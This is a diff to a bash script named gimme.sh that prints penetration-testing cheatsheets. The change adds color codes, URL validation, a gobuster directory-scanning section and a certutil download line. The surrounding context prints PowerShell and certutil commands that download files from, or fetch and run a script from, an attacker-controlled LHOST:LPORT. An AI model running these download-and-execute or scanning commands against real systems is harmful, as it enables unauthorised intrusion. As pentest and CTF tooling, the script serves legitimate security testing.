@@ -2,6 +2,18 @@
 
 
 # Colors : https://stackoverflow.com/questions/5947742/how-to-change-the-output-color-of-echo-in-linux
+
+# Regular Colors
+Black='\033[0;30m'        # Black
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+Blue='\033[0;34m'         # Blue
+Purple='\033[0;35m'       # Purple
+Cyan='\033[0;36m'         # Cyan
+White='\033[0;37m'        # White
+
+# Bold
 BBlack='\033[1;30m'       # Black
 BRed='\033[1;31m'         # Red
 BGreen='\033[1;32m'       # Green
@@ -11,6 +23,8 @@ BPurple='\033[1;35m'      # Purple
 BCyan='\033[1;36m'        # Cyan
 BWhite='\033[1;37m'       # White
 
+# REGREX
+url_regrex='(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
 
 function rev()
 {
@@ -101,6 +115,7 @@ case $3 in
 		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
 		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe','C:\destination\path\\\file.exe')\"$BWhite"
 		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.ps1')$BWhite"
+			echo -e "[$BGreen certutil $BWhite] :$BBlue certutil.exe -urlcache -split -f 'http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe' file.exe"
 		 	echo -e "-----------------------------------------------------------"
 		 	echo -e "[$BGreen FTP $BWhite]"
 		 	echo -e "$BPurple Setup FTP Server On Attacker Machine$BWhite"
@@ -161,6 +176,25 @@ function venom()
 	esac
 
 }
+
+function gobuster()
+{
+			echo -e "$BWhite====================== Gobuster ====================="
+			if [[ $1 =~ ^https ]]
+			then
+				# HTTPS
+			 	echo -e "$White gobuster dir -u $BYellow$1$White -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x 'txt,html,php,sh' -t 150 -o gobuster.txt"
+				echo -e "$white gobuster dir -u $BYellow$1$White -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s '200,204,301,302,307,401,403' -x 'txt,html,php,sh'"
+				echo -e "$BWhite================================================="
+			else
+				# HTTP
+				echo -e "$white gobuster dir -u $BYellow$1$White -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,307,401,403' -x 'txt,html,php,asp,aspx,jsp' -e -l"
+				echo -e "$white gobuster dir -u $BYellow$1$White -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,401,403' -x 'txt,html,php,asp,aspx,jsp' -e -l"
+				echo -e "$BWhite================================================="
+			fi
+}
+
+
 function validate_ip()
 {
 	if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && [[ $2 -lt 65536 && $2 -gt 0 ]] 
@@ -172,6 +206,19 @@ function validate_ip()
 		fi
 }
 
+function validate_url()
+{
+	
+	if [[ $1 =~ $url_regrex ]]
+		then
+  			:
+		else
+				 	echo -e "Invalid URL[:PORT]Value !!!"
+			exit
+		fi
+}
+
+
 if [ $# -lt 1 ]
 then
 			echo -e "$BWhite====================== GimmeGimme ================================"
@@ -181,6 +228,8 @@ then
 		 	echo -e "			Syntax: gimme.sh --file-transfer LHOST LPORT win/lin"
 		 	echo -e "$BGreen	--msf-venom$BWhite 	: Print msfvenom Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --msf-venom LHOST LPORT"
+			echo -e "$BGreen	--gobuster$BWhite 	: Print gobuster Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --gobuster URL PORT"
 		 	echo -e "$BWhite=================================================================="
 	exit
 fi
@@ -212,6 +261,16 @@ case $1 in
 		fi
 		validate_ip $2 $3
 		venom $2 $3 $4
+	;;
+	"--gobuster")
+		if [ $# -lt 2 ]
+		then
+				 	echo -e "Syntax: gimme.sh --gobuster URL<:PORT>"
+			exit
+		fi
+		validate_url $2
+		gobuster $2
+	
 	;;
 	*)
 			 	echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
